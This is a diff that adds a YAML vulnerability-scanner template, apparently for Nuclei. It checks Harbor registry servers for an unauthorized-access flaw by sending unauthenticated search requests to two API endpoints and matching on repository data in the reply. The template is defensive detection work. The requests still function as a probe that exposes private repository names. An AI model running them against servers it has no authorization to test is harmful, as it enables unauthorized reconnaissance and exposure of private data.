@@ -1,0 +1,48 @@
+id: harbor-unauthorized-access
+
+info:
+  name: Harbor Unauthorized Access Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Harbor versions V1.X.X to v2.5.3 and V2.6.0 have a vulnerability allowing unauthorized access to private and public mirror warehouses.
+  reference:
+    - https://github.com/lanqingaa/123/blob/main/README.md
+  tags:
+    - unauthorized-access
+    - harbor
+
+http:
+  - raw:
+      - |
+        GET /api/v2.0/search?q=/ HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "repository_name"
+          - "\"project_id\""
+        part: body
+
+  - raw:
+      - |
+        GET /api/search?q=/ HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "repository_name"
+          - "\"project_id\""
+        part: body
